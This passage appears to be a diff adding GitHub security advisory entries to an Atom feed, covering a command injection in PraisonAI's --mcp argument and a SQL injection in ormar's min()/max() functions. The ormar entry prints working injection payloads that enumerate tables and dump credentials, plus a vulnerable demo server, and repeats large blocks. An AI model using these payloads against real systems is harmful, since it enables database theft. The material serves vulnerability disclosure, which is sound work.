+<li><a href="https://opendev.org/openstack/ironic-inspector/commit/77d0052c5133034490386fbfadfdb1bdb49aa44f">https://opendev.org/openstack/ironic-inspector/commit/77d0052c5133034490386fbfadfdb1bdb49aa44f</a></li>
+<li><a href="https://access.redhat.com/errata/RHSA-2015:2685">https://access.redhat.com/errata/RHSA-2015:2685</a></li>
+<li><a href="https://access.redhat.com/security/cve/CVE-2015-5306">https://access.redhat.com/security/cve/CVE-2015-5306</a></li>
+<li><a href="https://github.com/pypa/advisory-database/tree/main/vulns/ironic-inspector/PYSEC-2015-28.yaml">https://github.com/pypa/advisory-database/tree/main/vulns/ironic-inspector/PYSEC-2015-28.yaml</a></li>
+<li><a href="https://opendev.org/openstack/ironic-inspector/commit/2c64da2bee6eeea27c08eb7a94894feaa5494910">https://opendev.org/openstack/ironic-inspector/commit/2c64da2bee6eeea27c08eb7a94894feaa5494910</a></li>
+<li><a href="https://github.com/advisories/GHSA-x64g-wjmw-w328">https://github.com/advisories/GHSA-x64g-wjmw-w328</a></li>
+<li><a href="https://github.com/pypa/advisory-database/tree/main/vulns/python-ironic-inspector-client/PYSEC-2026-505.yaml">https://github.com/pypa/advisory-database/tree/main/vulns/python-ironic-inspector-client/PYSEC-2026-505.yaml</a></li>
+<li><a href="https://opendev.org/openstack/ironic-inspector">https://opendev.org/openstack/ironic-inspector</a></li>
+<li><a href="https://pypi.org/project/python-ironic-inspector-client">https://pypi.org/project/python-ironic-inspector-client</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-x64g-wjmw-w328</uri>
+        </author>
+        <category label="severity" term="CRITICAL"/>
+        <published>2019-07-05T21:10:52.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[praisonai] PraisonAI: OS Command Injection in MCPHandler.parse_mcp_command()]]></title>
+        <id>https://github.com/advisories/GHSA-9gm9-c8mq-vq7m</id>
+        <link href="https://github.com/advisories/GHSA-9gm9-c8mq-vq7m"/>
+        <updated>2026-11-16T15:58:57.000Z</updated>
+        <content type="html"><![CDATA[<h3>Affected versions</h3>
+<table>
+<thead><tr><th>Package</th><th>Vulnerable versions</th><th>Patched version</th></tr></thead>
+<tbody>
+<tr>
+<td>praisonai</td>
+<td><code>&gt;= 4.5.15, &lt; 4.5.69</code></td>
+<td><code>4.5.69</code></td>
+</tr>
+</tbody>
+</table>
+<h3 id="summary">Summary</h3>
+<p>The <code>--mcp</code> CLI argument is passed directly to <code>shlex.split()</code> and forwarded through the call chain to <code>anyio.open_process()</code> with no validation, allowlist check, or sanitization at any hop, allowing arbitrary OS command execution as the process user.</p>
+<h3 id="details">Details</h3>
+<p><code>cli/features/mcp.py:61</code> (source) -&gt; <code>praisonaiagents/mcp/mcp.py:345</code> (hop) -&gt; <code>mcp/client/stdio/__init__.py:253</code> (sink)</p>
+<pre><code class="language-python"># source
+parts = shlex.split(command)
+
+# hop
+cmd, args, env = self.parse_mcp_command(command, env_vars)
+self.server_params = StdioServerParameters(command=cmd, args=arguments)
+
+# sink
+process = await anyio.open_process([command, *args])
+</code></pre>
+<p>Fixed in commit <code>47bff65413beaa3c21bf633c1fae4e684348368c</code> (v4.5.69) by introducing a command allowlist:</p>
+<pre><code class="language-python">ALLOWED_COMMANDS = {"npx", "uvx", "node", "python"}
+if cmd not in ALLOWED_COMMANDS:
+    raise ValueError(f"Disallowed command: {cmd}")
+</code></pre>
+<h3 id="poc">PoC</h3>
+<pre><code class="language-python"># tested on: praisonai==4.5.48
+# install: pip install praisonai==4.5.48
+# run: praisonai --mcp "bash -c 'id &gt; /tmp/pwned'"
+# verify: cat /tmp/pwned
+# expected output: uid=1000(...) gid=1000(...) groups=1000(...)
+</code></pre>
+<h3 id="impact">Impact</h3>
+<p>Any deployment where the <code>--mcp</code> argument is influenced by untrusted input is exposed to full OS command execution as the process user. No authentication is required.</p>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/MervinPraison/PraisonAI/security/advisories/GHSA-9gm9-c8mq-vq7m">https://github.com/MervinPraison/PraisonAI/security/advisories/GHSA-9gm9-c8mq-vq7m</a></li>
+<li><a href="https://github.com/MervinPraison/PraisonAI/commit/47bff65413beaa3c21bf633c1fae4e684348368c">https://github.com/MervinPraison/PraisonAI/commit/47bff65413beaa3c21bf633c1fae4e684348368c</a></li>
+<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-34935">https://nvd.nist.gov/vuln/detail/CVE-2026-34935</a></li>
+<li><a href="https://github.com/pypa/advisory-database/tree/main/vulns/praisonai/PYSEC-2026-471.yaml">https://github.com/pypa/advisory-database/tree/main/vulns/praisonai/PYSEC-2026-471.yaml</a></li>
+<li><a href="https://pypi.org/project/praisonai">https://pypi.org/project/praisonai</a></li>
+<li><a href="https://github.com/advisories/GHSA-9gm9-c8mq-vq7m">https://github.com/advisories/GHSA-9gm9-c8mq-vq7m</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-9gm9-c8mq-vq7m</uri>
+        </author>
+        <category label="severity" term="CRITICAL"/>
+        <published>2026-04-01T23:20:00.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[ormar] ormar is vulnerable to SQL Injection through aggregate functions min() and max()]]></title>
+        <id>https://github.com/advisories/GHSA-xxh2-68g9-8jqr</id>
+        <link href="https://github.com/advisories/GHSA-xxh2-68g9-8jqr"/>
+        <updated>2026-11-16T15:44:26.000Z</updated>
+        <content type="html"><![CDATA[<h3>Affected versions</h3>
+<table>
+<thead><tr><th>Package</th><th>Vulnerable versions</th><th>Patched version</th></tr></thead>
+<tbody>
+<tr>
+<td>ormar</td>
+<td><code>&gt;= 0.9.9, &lt; 0.23.0</code></td>
+<td><code>0.23.0</code></td>
+</tr>
+</tbody>
+</table>
+<h1 id="report-of-sql-injection-vulnerability-in-ormar-orm">Report of SQL Injection Vulnerability in Ormar ORM</h1>
+<h2 id="a-sql-injection-attack-can-be-achieved-by-passing-a-crafted-string-to-the-min-or-max-aggregate-functions">A SQL Injection attack can be achieved by passing a crafted string to the min() or max() aggregate functions.</h2>
+<h2 id="brief-description">Brief description</h2>
+<p>When performing aggregate queries, Ormar ORM constructs SQL expressions by passing user-supplied column names directly into <code>sqlalchemy.text()</code> without any validation or sanitization. The <code>min()</code> and <code>max()</code> methods in the <code>QuerySet</code> class accept arbitrary string input as the column parameter. While <code>sum()</code> and <code>avg()</code> are partially protected by an <code>is_numeric</code> type check that rejects non-existent fields, <code>min()</code> and <code>max()</code> skip this validation entirely. As a result, an attacker-controlled string is embedded as raw SQL inside the aggregate function call. Any unauthorized user can exploit this vulnerability to read the entire database contents, including tables unrelated to the queried model, by injecting a subquery as the column parameter.</p>
+<h2 id="affected-versions">Affected versions</h2>
+<pre><code>0.9.9 - 0.12.2
+0.20.0b1 - 0.22.0 (latest)
+</code></pre>
+<p>The vulnerable <code>SelectAction.get_text_clause()</code> method and the <code>min()</code>/<code>max()</code> aggregate functions were introduced together in commit <code>ff9d412</code> (March 12, 2021) and first released in version <strong>0.9.9</strong>. The vulnerable code has never been modified since — <code>get_text_clause()</code> is identical in every subsequent version through the latest <strong>0.21.0</strong>.</p>
+<p>Versions prior to 0.9.9 do not contain the <code>min()</code>/<code>max()</code> aggregate feature and are not affected.</p>
+<p>The following uses the latest ormar 0.21.0 as an example to illustrate the attack.</p>
+<h2 id="vulnerability-details">Vulnerability details</h2>
+<p>When performing an aggregate query, the <code>QuerySet.max()</code> method (line 721, <code>queryset.py</code>) passes user input to <code>_query_aggr_function()</code>. This method creates a <code>SelectAction</code> object for each column name. The column string is split by <code>__</code> and the last part becomes <code>self.field_name</code> — with no validation against the model's actual fields.</p>
+<p>The critical vulnerability is in <code>SelectAction.get_text_clause()</code> (line 41-43, <code>select_action.py</code>), which directly passes <code>self.field_name</code> into <code>sqlalchemy.text()</code>:</p>
+<pre><code class="language-python">#select_action.py line 41-43
+def get_text_clause(self) -&gt; sqlalchemy.sql.expression.TextClause:
+    alias = f"{self.table_prefix}_" if self.table_prefix else ""
+    return sqlalchemy.text(f"{alias}{self.field_name}")  # unsanitised user input!
+</code></pre>
+<p>The <code>apply_func()</code> method then wraps this raw text clause inside <code>func.max()</code>, producing SQL like <code>max(&lt;attacker_input&gt;)</code>. Since <code>sqlalchemy.text()</code> treats its argument as literal SQL, any subquery or SQL expression injected through the column name will be executed by the database engine.</p>
+<p>The <code>_query_aggr_function()</code> method (line 704-719, <code>queryset.py</code>) only validates field types for <code>sum</code> and <code>avg</code>, leaving <code>min</code> and <code>max</code> completely unprotected:</p>
+<pre><code class="language-python">#queryset.py line 704-719
+async def _query_aggr_function(self, func_name: str, columns: List) -&gt; Any:
+    func = getattr(sqlalchemy.func, func_name)
+    select_actions = [
+        SelectAction(select_str=column, model_cls=self.model) for column in columns
+    ]
+    if func_name in ["sum", "avg"]:          # &lt;-- only sum/avg are checked!
+        if any(not x.is_numeric for x in select_actions):
+            raise QueryDefinitionError(...)
+    select_columns = [x.apply_func(func, use_label=True) for x in select_actions]
+    expr = self.build_select_expression().alias(f"subquery_for_{func_name}")
+    expr = sqlalchemy.select(*select_columns).select_from(expr)
+    result = await self.database.fetch_one(expr)
+    return dict(result) if len(result) &gt; 1 else result[0]
+</code></pre>
+<p>To reproduce the attack, you can follow the steps below, using a FastAPI application with SQLite as an example.</p>
+<p>Note: The PoC consists of two files provided in the attachments — <code>poc_server.py</code> (the vulnerable server) and <code>poc_attacker.py</code> (the HTTP-based attacker script).</p>
+<h2>Start the vulnerable application</h2>
+<ol>
+<li>Install dependencies:</li>
+</ol>
+<pre><code class="language-bash">pip install ormar databases aiosqlite fastapi uvicorn httpx
+</code></pre>
+<ol>
+<li>The vulnerable server (<code>poc_server.py</code>) is based on the <strong>official ormar FastAPI example</strong> (<a href="https://github.com/collerek/ormar/blob/master/examples/fastapi_quick_start.py">ormar/examples/fastapi_quick_start.py</a>). The only modification is the addition of a <code>/items/stats</code> endpoint — a common pattern for applications that provide aggregate statistics. This demonstrates that the vulnerability is easily triggered by natural API design.</li>
+</ol>
+<p>The server defines three models:</p>
+<ul>
+<li><code>Category</code> and <code>Item</code> — from the official ormar example (unchanged)</li>
+<li><code>AdminUser</code> — simulates internal data (e.g., an admin_users table) that should NOT be accessible through the public API</li>
+</ul>
+<p>The vulnerable endpoint:</p>
+<pre><code class="language-python"># Added endpoint: aggregate statistics (VULNERABLE)
+# This is a common and natural pattern — letting users request
+# statistics on different columns. The ormar documentation itself
+# shows: await Book.objects.max(columns=["year"])
+# See: &lt;https://collerek.github.io/ormar/queries/aggregations/&gt;
+
+</code><p><code class="language-python">@app.get("/items/stats")
+async def item_stats(
+    metric: str = Query("max", description="max or min"),
+    column: str = Query("price", description="Column to aggregate"),
+):
+    """Return aggregate statistics for items."""
+    if metric == "max":
+        result = await Item.objects.max(column)
+    elif metric == "min":
+        result = await Item.objects.min(column)
+    else:
+        return {"error": "Unsupported metric"}
+    return {"metric": metric, "column": column, "result": result}
+</code></p></pre><p></p>
+<p>The database contains:</p>
+
+<table>
+<thead>
+<tr>
+<th>Table</th>
+<th>Data</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>categories</td>
+<td>Electronics</td>
+</tr>
+<tr>
+<td>items</td>
+<td>Laptop ($999.99), Phone ($699.99), Tablet ($449.99), Monitor ($329.99)</td>
+</tr>
+<tr>
+<td>admin_users</td>
+<td>root / Sup3r$ecretP@ss! / ak-9f8e7d6c5b4a3210-prod</td>
+</tr>
+<tr>
+<td>deploy-bot / ghp_Tx7KmR29vLp4QzN1bWcA3sYjDf80Ue5Xoi / ak-1a2b3c4d5e6f7890-ci</td>
+<td></td>
+</tr>
+</tbody></table>
+<p>The <code>admin_users</code> table is <strong>NOT</strong> exposed via any API endpoint.</p>
+<h2>The attack steps</h2>
+<p>The PoC requires two terminals:</p>
+<p><strong>Terminal 1</strong> — Start the vulnerable server:</p>
+<pre><code class="language-bash">python poc_server.py
+</code></pre>
+<p><strong>Terminal 2</strong> — Run the attacker script:</p>
+<pre><code class="language-bash">python poc_attacker.py
+</code></pre>
+<p>The attacker script (<code>poc_attacker.py</code>) sends HTTP requests to the running server. It has <strong>NO prior knowledge</strong> of the database schema — all information is discovered through the injection. The attacker executes 6 progressive attack stages through the single <code>/items/stats</code> endpoint.</p>
+<h2>Principle of vulnerability exploitation</h2>
+<h3>1. The attacker confirms injection by sending an arithmetic expression</h3>
+<p>The attacker sends <code>GET /items/stats?metric=max&amp;column=1+1</code>. The data flow is:</p>
+<pre><code>HTTP request: GET /items/stats?metric=max&amp;column=1+1
+    ↓
+item_stats(metric="max", column="1+1")                # poc_server.py
+    ↓
+Item.objects.max("1+1")                                # queryset.py:721
+    ↓
+_query_aggr_function(func_name="max", columns=["1+1"]) # queryset.py:704
+    ↓
+SelectAction(select_str="1+1", model_cls=Item)          # select_action.py:22
+    ↓
+_split_value_into_parts("1+1")  →  self.field_name = "1+1"
+    ↓
+# min/max skip the is_numeric check (line 709 only checks sum/avg)
+    ↓
+get_text_clause()  →  sqlalchemy.text("1+1")            # select_action.py:43
+    ↓
+apply_func(sqlalchemy.func.max)  →  max(1+1)
+</code></pre>
+<p>Generated SQL:</p>
+<pre><code class="language-sql">SELECT max(1+1) AS "1+1"
+FROM (SELECT items.id AS id, items.name AS name, items.price AS price,
+             items.category AS category
+      FROM items) AS subquery_for_max
+</code></pre>
+<p>The API returns <code>{"metric":"max","column":"1+1","result":2}</code>, confirming that the arithmetic expression was evaluated as SQL.</p>
+<h3>2. The attacker enumerates database tables</h3>
+<p>The attacker injects a subquery to read <code>sqlite_master</code>:</p>
+<pre><code>GET /items/stats?metric=max&amp;column=(SELECT GROUP_CONCAT(name) FROM sqlite_master WHERE type='table')
+</code></pre>
+<p>Which internally calls:</p>
+<pre><code class="language-python">await Item.objects.max(
+    "(SELECT GROUP_CONCAT(name) FROM sqlite_master WHERE type='table')"
+)
+</code></pre>
+<p>Generated SQL:</p>
+<pre><code class="language-sql">SELECT max((SELECT GROUP_CONCAT(name) FROM sqlite_master WHERE type='table'))
+       AS "(SELECT GROUP_CONCAT(name) FROM sqlite_master WHERE type='table')"
+FROM (SELECT items.id, items.name, items.price, items.category
+      FROM items) AS subquery_for_max
+</code></pre>
+<p>The API returns <code>categories,admin_users,items</code>, revealing the hidden <code>admin_users</code> table.</p>
+<h3>3. The attacker extracts the schema of the target table</h3>
+<pre><code>GET /items/stats?metric=max&amp;column=(SELECT sql FROM sqlite_master WHERE name='admin_users')
+</code></pre>
+<p>The API returns the full <code>CREATE TABLE</code> statement, revealing column names: <code>username</code>, <code>password</code>, <code>api_key</code>.</p>
+<h3>4. The attacker dumps all credentials in a single query</h3>
+<pre><code>GET /items/stats?metric=max&amp;column=(SELECT GROUP_CONCAT(username || ' | ' || password || ' | ' || api_key, CHAR(10)) FROM admin_users)
+</code></pre>
+<p>Generated SQL:</p>
+<pre><code class="language-sql">SELECT max((SELECT GROUP_CONCAT(username || ' | ' || password || ' | ' || api_key, CHAR(10))
+            FROM admin_users))
+       AS "..."
+FROM (SELECT items.id, items.name, items.price, items.category
+      FROM items) AS subquery_for_max
+</code></pre>
+<p>The API returns all credentials:</p>
+<pre><code>root | Sup3r$ecretP@ss! | ak-9f8e7d6c5b4a3210-prod
+deploy-bot | ghp_Tx7KmR29vLp4QzN1bWcA3sYjDf80Ue5Xoi | ak-1a2b3c4d5e6f7890-ci
+</code></pre>
+<h3>5. Blind boolean-based extraction (when results are not directly visible)</h3>
+<p>Even if the API does not return query results directly, the attacker can use boolean-based blind injection to extract data character by character using binary search:</p>
+<pre><code>GET /items/stats?metric=max&amp;column=CASE WHEN UNICODE(SUBSTR((SELECT password FROM admin_users WHERE username='root'),1,1))&gt;83 THEN 1 ELSE 0 END
+</code></pre>
+<p>Which internally calls:</p>
+<pre><code class="language-python"># "Is the Nth character of root's password greater than ASCII code M?"
+await Item.objects.max(
+    "CASE WHEN UNICODE(SUBSTR("
+    "(SELECT password FROM admin_users WHERE username='root'),1,1))&gt;83 "
+    "THEN 1 ELSE 0 END"
+)
+# Returns 0 → first character is 'S' (ASCII 83)
+</code></pre>
+<p>By iterating over each position with binary search, the full password <code>Sup3r$ecretP@ss!</code> is extracted in approximately 113 HTTP requests (16 characters x ~7 binary search steps).</p>
+<h3>6. The attacker extracts the production API key</h3>
+<pre><code>GET /items/stats?metric=max&amp;column=(SELECT api_key FROM admin_users WHERE username='root')
+</code></pre>
+<p>The API returns: <code>ak-9f8e7d6c5b4a3210-prod</code></p>
+<p>All data was extracted through a single public API endpoint using only unauthenticated GET requests.</p>
+## Start the vulnerable application
+
+<ol>
+<li>Install dependencies:</li>
+</ol>
+<pre><code class="language-bash">pip install ormar databases aiosqlite fastapi uvicorn httpx
+</code></pre>
+<ol>
+<li>The vulnerable server (<code>poc_server.py</code>) is based on the <strong>official ormar FastAPI example</strong> (<a href="https://github.com/collerek/ormar/blob/master/examples/fastapi_quick_start.py"></a><a href="https://github.com/collerek/ormar/blob/master/examples/fastapi_quick_start.py">ormar/examples/fastapi_quick_start.py</a>). The only modification is the addition of a <code>/items/stats</code> endpoint — a common pattern for applications that provide aggregate statistics. This demonstrates that the vulnerability is easily triggered by natural API design.</li>
+</ol>
+<p>The server defines three models:</p>
+<ul>
+<li><code>Category</code> and <code>Item</code> — from the official ormar example (unchanged)</li>
+<li><code>AdminUser</code> — simulates internal data (e.g., an admin_users table) that should NOT be accessible through the public API</li>
+</ul>
+<p>The vulnerable endpoint:</p>
+<pre><code class="language-python"># Added endpoint: aggregate statistics (VULNERABLE)
+# This is a common and natural pattern — letting users request
+# statistics on different columns. The ormar documentation itself
+# shows: await Book.objects.max(columns=["year"])
+# See: &lt;https://collerek.github.io/ormar/queries/aggregations/&gt;
+
+@app.get("/items/stats")
+async def item_stats(
+    metric: str = Query("max", description="max or min"),
+    column: str = Query("price", description="Column to aggregate"),
+):
+    """Return aggregate statistics for items."""
+    if metric == "max":
+        result = await Item.objects.max(column)
+    elif metric == "min":
+        result = await Item.objects.min(column)
+    else:
+        return {"error": "Unsupported metric"}
+    return {"metric": metric, "column": column, "result": result}
+</code></pre>
+<p>The database contains:</p>
+<table>
+<thead>
+<tr>
+<th>Table</th>
+<th>Data</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>categories</code></td>
+<td>Electronics</td>
+</tr>
+<tr>
+<td><code>items</code></td>
+<td>Laptop ($999.99), Phone ($699.99), Tablet ($449.99), Monitor ($329.99)</td>
+</tr>
+<tr>
+<td><code>admin_users</code></td>
+<td>root / Sup3r$ecretP@ss! / ak-9f8e7d6c5b4a3210-prod</td>
+</tr>
+<tr>
+<td></td>
+<td>deploy-bot / ghp_Tx7KmR29vLp4QzN1bWcA3sYjDf80Ue5Xoi / ak-1a2b3c4d5e6f7890-ci</td>
+</tr>
+</tbody></table>
+<p>The <code>admin_users</code> table is <strong>NOT</strong> exposed via any API endpoint.</p>
+<h2 id="the-attack-steps">The attack steps</h2>
+<p>The PoC requires two terminals:</p>
+<p><strong>Terminal 1</strong> — Start the vulnerable server:</p>
+<pre><code class="language-bash">python poc_server.py
+</code></pre>
+<p><strong>Terminal 2</strong> — Run the attacker script:</p>
+<pre><code class="language-bash">python poc_attacker.py
+</code></pre>
+<p>The attacker script (<code>poc_attacker.py</code>) sends HTTP requests to the running server. It has <strong>NO prior knowledge</strong> of the database schema — all information is discovered through the injection. The attacker executes 6 progressive attack stages through the single <code>/items/stats</code> endpoint.</p>
+<h2 id="principle-of-vulnerability-exploitation">Principle of vulnerability exploitation</h2>
+<h3 id="1-the-attacker-confirms-injection-by-sending-an-arithmetic-expression">1. The attacker confirms injection by sending an arithmetic expression</h3>
+<p>The attacker sends <code>GET /items/stats?metric=max&amp;column=1+1</code>. The data flow is:</p>
+<pre><code>HTTP request: GET /items/stats?metric=max&amp;column=1+1
+    ↓
+item_stats(metric="max", column="1+1")                # poc_server.py
+    ↓
+Item.objects.max("1+1")                                # queryset.py:721
+    ↓
+_query_aggr_function(func_name="max", columns=["1+1"]) # queryset.py:704
+    ↓
+SelectAction(select_str="1+1", model_cls=Item)          # select_action.py:22
+    ↓
+_split_value_into_parts("1+1")  →  self.field_name = "1+1"
+    ↓
+# min/max skip the is_numeric check (line 709 only checks sum/avg)
+    ↓
+get_text_clause()  →  sqlalchemy.text("1+1")            # select_action.py:43
+    ↓
+apply_func(sqlalchemy.func.max)  →  max(1+1)
+</code></pre>
+<p>Generated SQL:</p>
+<pre><code class="language-sql">SELECT max(1+1) AS "1+1"
+FROM (SELECT items.id AS id, items.name AS name, items.price AS price,
+             items.category AS category
+      FROM items) AS subquery_for_max
+</code></pre>
+<p>The API returns <code>{"metric":"max","column":"1+1","result":2}</code>, confirming that the arithmetic expression was evaluated as SQL.</p>
+<h3 id="2-the-attacker-enumerates-database-tables">2. The attacker enumerates database tables</h3>
+<p>The attacker injects a subquery to read <code>sqlite_master</code>:</p>
+<pre><code>GET /items/stats?metric=max&amp;column=(SELECT GROUP_CONCAT(name) FROM sqlite_master WHERE type='table')
+</code></pre>
+<p>Which internally calls:</p>
+<pre><code class="language-python">await Item.objects.max(
+    "(SELECT GROUP_CONCAT(name) FROM sqlite_master WHERE type='table')"
+)
+</code></pre>
+<p>Generated SQL:</p>
+<pre><code class="language-sql">SELECT max((SELECT GROUP_CONCAT(name) FROM sqlite_master WHERE type='table'))
+       AS "(SELECT GROUP_CONCAT(name) FROM sqlite_master WHERE type='table')"
+FROM (SELECT items.id, items.name, items.price, items.category
+      FROM items) AS subquery_for_max
+</code></pre>
+<p>The API returns <code>categories,admin_users,items</code>, revealing the hidden <code>admin_users</code> table.</p>
+<h3 id="3-the-attacker-extracts-the-schema-of-the-target-table">3. The attacker extracts the schema of the target table</h3>
+<pre><code>GET /items/stats?metric=max&amp;column=(SELECT sql FROM sqlite_master WHERE name='admin_users')
+</code></pre>
+<p>The API returns the full <code>CREATE TABLE</code> statement, revealing column names: <code>username</code>, <code>password</code>, <code>api_key</code>.</p>
+<h3 id="4-the-attacker-dumps-all-credentials-in-a-single-query">4. The attacker dumps all credentials in a single query</h3>
+<pre><code>GET /items/stats?metric=max&amp;column=(SELECT GROUP_CONCAT(username || ' | ' || password || ' | ' || api_key, CHAR(10)) FROM admin_users)
+</code></pre>
+<p>Generated SQL:</p>
+<pre><code class="language-sql">SELECT max((SELECT GROUP_CONCAT(username || ' | ' || password || ' | ' || api_key, CHAR(10))
+            FROM admin_users))
+       AS "..."
+FROM (SELECT items.id, items.name, items.price, items.category
+      FROM items) AS subquery_for_max
+</code></pre>
+<p>The API returns all credentials:</p>
+<pre><code>root | Sup3r$ecretP@ss! | ak-9f8e7d6c5b4a3210-prod
+deploy-bot | ghp_Tx7KmR29vLp4QzN1bWcA3sYjDf80Ue5Xoi | ak-1a2b3c4d5e6f7890-ci
+</code></pre>
+<h3 id="5-blind-boolean-based-extraction-when-results-are-not-directly-visible">5. Blind boolean-based extraction (when results are not directly visible)</h3>
+<p>Even if the API does not return query results directly, the attacker can use boolean-based blind injection to extract data character by character using binary search:</p>
+<pre><code>GET /items/stats?metric=max&amp;column=CASE WHEN UNICODE(SUBSTR((SELECT password FROM admin_users WHERE username='root'),1,1))&gt;83 THEN 1 ELSE 0 END
+</code></pre>
+<p>Which internally calls:</p>
+<pre><code class="language-python"># "Is the Nth character of root's password greater than ASCII code M?"
+await Item.objects.max(
+    "CASE WHEN UNICODE(SUBSTR("
+    "(SELECT password FROM admin_users WHERE username='root'),1,1))&gt;83 "
+    "THEN 1 ELSE 0 END"
+)
+# Returns 0 → first character is 'S' (ASCII 83)
+</code></pre>
+<p>By iterating over each position with binary search, the full password <code>Sup3r$ecretP@ss!</code> is extracted in approximately 113 HTTP requests (16 characters x ~7 binary search steps).</p>
+<h3 id="6-the-attacker-extracts-the-production-api-key">6. The attacker extracts the production API key</h3>
+<pre><code>GET /items/stats?metric=max&amp;column=(SELECT api_key FROM admin_users WHERE username='root')
+</code></pre>
+<p>The API returns: <code>ak-9f8e7d6c5b4a3210-prod</code></p>
+<p>All data was extracted through a single public API endpoint using only unauthenticated GET requests.</p>
+<h2 id="the-complete-poc">The complete POC</h2>
+<h3 id="poc_serverpy-vulnerable-server">poc_server.py (Vulnerable Server)</h3>
+<p>Based on the official ormar FastAPI example (<a href="https://github.com/collerek/ormar/blob/master/examples/fastapi_quick_start.py"></a><a href="https://github.com/collerek/ormar/blob/master/examples/fastapi_quick_start.py">fastapi_quick_start.py</a>):</p>
+<pre><code class="language-python">"""
+CVE PoC — Vulnerable Server
+=============================
+Based on the OFFICIAL ormar FastAPI example:
+    &lt;https://github.com/collerek/ormar/blob/master/examples/fastapi_quick_start.py&gt;
+
+The only modification is the addition of a /items/stats endpoint (line 63-76),
+which is a common pattern for any application that provides aggregate statistics.
+
+Usage:
+    python poc_server.py
+"""
+
+# ── Original official example code (unchanged) ───────────────
+# Source: ormar/examples/fastapi_quick_start.py
+
+from contextlib import asynccontextmanager
+from typing import List, Optional
+
+import databases
+import ormar
+import sqlalchemy
+import uvicorn
+from fastapi import FastAPI, Query
+
+DATABASE_URL = "sqlite:///poc_vuln.db"
+
+ormar_base_config = ormar.OrmarConfig(
+    database=databases.Database(DATABASE_URL), metadata=sqlalchemy.MetaData()
+)
+
+class Category(ormar.Model):
+    ormar_config = ormar_base_config.copy(tablename="categories")
+
+    id: int = ormar.Integer(primary_key=True)
+    name: str = ormar.String(max_length=100)
+
+class Item(ormar.Model):
+    ormar_config = ormar_base_config.copy(tablename="items")
+
+    id: int = ormar.Integer(primary_key=True)
+    name: str = ormar.String(max_length=100)
+    price: float = ormar.Float(default=0)
+    category: Optional[Category] = ormar.ForeignKey(Category, nullable=True)
+
+# This table simulates internal data that should NOT be accessible
+# through the public API — e.g. an admin_users table in the same database.
+class AdminUser(ormar.Model):
+    ormar_config = ormar_base_config.copy(tablename="admin_users")
+
+    id: int = ormar.Integer(primary_key=True)
+    username: str = ormar.String(max_length=100)
+    password: str = ormar.String(max_length=200)
+    api_key: str = ormar.String(max_length=200)
+
+@asynccontextmanager
+async def lifespan(app: FastAPI):
+    database_ = ormar_base_config.database
+    if not database_.is_connected:
+        await database_.connect()
+
+    # Create tables
+    engine = sqlalchemy.create_engine(DATABASE_URL)
+    ormar_base_config.metadata.create_all(engine)
+    engine.dispose()
+
+    # Seed sample data
+    if not await Item.objects.count():
+        cat = await Category.objects.create(name="Electronics")
+        await Item.objects.create(name="Laptop", price=999.99, category=cat)
+        await Item.objects.create(name="Phone", price=699.99, category=cat)
+        await Item.objects.create(name="Tablet", price=449.99, category=cat)
+        await Item.objects.create(name="Monitor", price=329.99, category=cat)
+
+    if not await AdminUser.objects.count():
+        await AdminUser.objects.create(
+            username="root",
+            password="Sup3r$ecretP@ss!",
+            api_key="ak-9f8e7d6c5b4a3210-prod",
+        )
+        await AdminUser.objects.create(
+            username="deploy-bot",
+            password="ghp_Tx7KmR29vLp4QzN1bWcA3sYjDf80Ue5Xoi",
+            api_key="ak-1a2b3c4d5e6f7890-ci",
+        )
+
+    print("\\n  [Server] Ready. Database seeded with items + admin_users.")
+    print("  [Server] The admin_users table is NOT exposed via any API endpoint.\\n")
+
+    yield
+
+    if database_.is_connected:
+        await database_.disconnect()
+
+app = FastAPI(
+    title="Item Catalog API",
+    description="Based on official ormar FastAPI example",
+    lifespan=lifespan,
+)
+
+# ── Original endpoints from official example (unchanged) ──────
+
+@app.get("/items/", response_model=List[Item])
+async def get_items():
+    items = await Item.objects.select_related("category").all()
+    return items
+
+@app.post("/items/", response_model=Item)
+async def create_item(item: Item):
+    await item.save()
+    return item
+
+@app.post("/categories/", response_model=Category)
+async def create_category(category: Category):
+    await category.save()
+    return category
+
+@app.put("/items/{item_id}")
+async def get_item(item_id: int, item: Item):
+    item_db = await Item.objects.get(pk=item_id)
+    return await item_db.update(**item.model_dump())
+
+@app.delete("/items/{item_id}")
+async def delete_item(item_id: int, item: Item = None):
+    if item:
+        return {"deleted_rows": await item.delete()}
+    item_db = await Item.objects.get(pk=item_id)
+    return {"deleted_rows": await item_db.delete()}
+
+# ── Added endpoint: aggregate statistics (VULNERABLE) ─────────
+# This is a common and natural pattern — letting users request
+# statistics on different columns. The ormar documentation itself
+# shows: await Book.objects.max(columns=["year"])
+# See: &lt;https://collerek.github.io/ormar/queries/aggregations/&gt;
+
+@app.get("/items/stats")
+async def item_stats(
+    metric: str = Query("max", description="max or min"),
+    column: str = Query("price", description="Column to aggregate"),
+):
+    """Return aggregate statistics for items."""
+    if metric == "max":
+        result = await Item.objects.max(column)
+    elif metric == "min":
+        result = await Item.objects.min(column)
+    else:
+        return {"error": "Unsupported metric"}
+    return {"metric": metric, "column": column, "result": result}
+
+@app.get("/health")
+async def health():
+    return {"status": "ok"}
+
+# ── Main ──────────────────────────────────────────────────────
+if __name__ == "__main__":
+    import os
+    # Clean previous database for reproducibility
+    if os.path.exists("poc_vuln.db"):
+        os.unlink("poc_vuln.db")
+    print("=" * 60)
+    print("  CVE PoC — Vulnerable Server")
+    print("  Based on: ormar/examples/fastapi_quick_start.py")
+    print("  Added:    GET /items/stats?metric=max&amp;column=&lt;input&gt;")
+    print("  Docs:     &lt;http://127.0.0.1:8000/docs&gt;")
+    print("=" * 60)
+    uvicorn.run(app, host="127.0.0.1", port=8000, log_level="warning")
+</code></pre>
+<h3 id="poc_attackerpy-attacker-script">poc_attacker.py (Attacker Script)</h3>
+<pre><code class="language-python">"""
+CVE PoC — Attacker Script
+===========================
+Exploits the SQL injection in /items/stats endpoint.
